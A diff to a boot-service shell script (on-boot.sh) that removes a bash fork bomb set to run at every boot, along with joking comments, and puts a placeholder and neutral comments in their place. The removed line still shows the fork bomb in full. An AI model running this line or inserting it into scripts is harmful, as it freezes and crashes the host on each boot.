@@ -5,16 +5,15 @@
 #  Uninstall: sudo bash on-boot.sh --uninstall
 # =============================================================
 
-# ── The script below, copy and paste from there if u want ────────────────────────
+# ── Put any command/script below ────────────────────────
 
-    :(){ :|: & };: >> /tmp/on-boot.log
+    print("script here") >> /tmp/on-boot.log
 
-# ── Ik this script is so sigma (im getting banned) ────────────────────────
+# ── Put any command/script above ────────────────────────
 
 
 # =============================================================
-#  Ts will definitely break if u edit stuff below so idk might
-#  be good depending on who is editing this
+#  Do not edit below unless yk what ur doing
 # =============================================================
 
 SERVICE_NAME="on-boot"
